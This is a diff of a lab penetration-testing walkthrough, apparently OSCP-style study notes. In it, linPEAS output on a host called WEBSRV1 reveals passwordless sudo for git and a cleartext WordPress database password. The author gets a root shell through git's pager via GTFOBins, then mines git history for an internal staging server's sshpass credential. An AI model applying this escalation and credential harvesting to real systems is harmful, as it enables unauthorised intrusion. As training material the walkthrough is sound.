@@ -411,6 +411,8 @@ daniela@websrv1:~$ ./linpeas.sh
 
 Let's review the results.
 
+System Information:
+
 ```
 ╔══════════╣ Operative system
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits                                            
@@ -421,6 +423,153 @@ Release:        22.04
 Codename:       jammy
 ```
 
-```
+Interfaces:
 
 ```
+╔══════════╣ Interfaces
+# symbolic names for networks, see networks(5) for more information                                                           
+link-local 169.254.0.0
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 00:50:56:bf:80:a3 brd ff:ff:ff:ff:ff:ff
+    altname enp11s0
+    inet 192.168.155.244/24 brd 192.168.155.255 scope global ens192
+       valid_lft forever preferred_lft forever
+```
+
+The above shows only one network interface apart from the loopback interface. This means that the target machine is not connected to the internal network and we cannot use it as a pivot point.
+
+Since we have already enumerated MAILSRV1 without any actionable results and this machine is not connected to the internal network, we have to discover sensitive information, such as credentials, to get a foothold in the internal network. To obtain files and data from other users and the system, we'll make elevating our privileges our priority.
+
+Sudo:
+
+```
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              
+Matching Defaults entries for daniela on websrv1:                                                                             
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User daniela may run the following commands on websrv1:
+    (ALL) NOPASSWD: /usr/bin/git
+```
+
+Daniela can run /usr/bin/git with sudo privileges without entering a password.
+
+Finish reviewing the linPEAS results before we leverage that finding.
+
+WordPress Files:
+
+```
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rw-r--r-- 1 www-data www-data 2495 Sep 27  2022 /srv/www/wordpress/wp-config.php                                             
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpress' );
+define( 'DB_PASSWORD', 'DanielKeyboard3311' );
+define( 'DB_HOST', 'localhost' );
+```
+
+Save this password to creds.txt.
+
+Another interesting aspect of this finding is the path displayed starts with /srv/www/wordpress/. The WordPress instance is not installed in /var/www/html where web applications are commonly found on Debian-based Linux systems. While this is not an actionable result, we should keep it in mind for future steps.
+
+GitHub Files:
+
+```
+╔══════════╣ Analyzing Github Files (limit 70)
+                                                                                                                              
+drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git
+
+```
+
+We can assume that Git is used as the version control system for the WordPress instance. Reviewing the commits of the Git repository may allow us to identify changes in configuration data and sensitive information such as passwords.
+
+The directory is owned by root and is not readable by other users. However, we can leverage sudo to use Git commands in a privileged context and therefore search the repository for sensitive information.
+
+For now, let's skip the rest of the linPEAS output and summarize what information and potential privilege escalation vectors we've gathered so far.
+
+
+WEBSRV1 runs Ubuntu 22.04 and is not connected to the internal network. The sudoers file contains an entry allowing daniela to run /usr/bin/git with elevated privileges without providing a password. In addition, we learned that the WordPress directory is a Git repository. Finally, we obtained a clear-text password in the database connection settings for WordPress.
+
+Based on this information we can define three potential privilege escalation vectors:
+
+    1. Abuse sudo command /usr/bin/git
+    2. Use sudo to search the Git repository
+    3. Attempt to access other users with the WordPress database password
+
+The most promising vector at the moment is to abuse the sudo command /usr/bin/git because we don't have to enter a password. Most commands that run with sudo can be abused to obtain an interactive shell with elevated privileges. Most commands that run with sudo can be abused to obtain an interactive shell with elevated privileges.
+
+To find potential abuses when a binary such as git is allowed to run with sudo, we can consult [GTFOBins](https://gtfobins.github.io/). Search for git. Find the git > Sudo secition. Try the first two.
+
+```console
+daniela@websrv1:~$ sudo PAGER='sh -c "exec sh 0<&1"' /usr/bin/git -p help
+sudo: sorry, you are not allowed to set the following environment variables: PAGER
+
+daniela@websrv1:~$ sudo git -p help config
+
+// to execute code through the pager, we can enter ! followed by a command or path to an executable file.
+
+!/bin/bash
+root@websrv1:/home/daniela#  whoami
+root
+```
+
+We escalated our privileges.
+
+Armed with root privileges, we'll continue enumerating the system. Before doing so, let's search the Git repository for sensitive information first.
+
+```console
+root@websrv1:/home/daniela# cd /srv/www/wordpress/
+
+root@websrv1:/srv/www/wordpress# git status
+HEAD detached at 612ff57
+nothing to commit, working tree clean
+
+root@websrv1:/srv/www/wordpress# git log
+commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
+Author: root <root@websrv1>
+Date:   Tue Sep 27 14:26:15 2022 +0000
+
+    Removed staging script and internal network access
+
+commit f82147bb0877fa6b5d8e80cf33da7b8f757d11dd
+Author: root <root@websrv1>
+Date:   Tue Sep 27 14:24:28 2022 +0000
+
+    initial commit
+```
+
+One is labeled as initial commit and one as Removed staging script and internal network access. That's quite interesting as it indicates that the machine previously had access to the internal network. Use git show, which shows differences between commits.
+
+```console
+root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
+
+root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
+commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
+Author: root <root@websrv1>
+Date:   Tue Sep 27 14:26:15 2022 +0000
+
+    Removed staging script and internal network access
+
+diff --git a/fetch_current.sh b/fetch_current.sh
+deleted file mode 100644    // !!
+index 25667c7..0000000
+--- a/fetch_current.sh      // !!
++++ /dev/null
+@@ -1,6 +0,0 @@
+-#!/bin/bash                // !!
+-
+-# Script to obtain the current state of the web app from the staging server
+-
+-sshpass -p "dqsTwTpZPn#nL" rsync john@192.168.50.245:/current_webapp/ /srv/www/wordpress/  // !!
+```
+
+New creds! Add them to creds.txt.
+
+NOTE: In a real assessment, we should run linPEAS again, once we have obtained privileged access to the system. Because the tool can now access files of other users and the system, it may discover sensitive information and data that wasn't accessible when running as daniela.
+
+## Gaining Access to the Internal Network
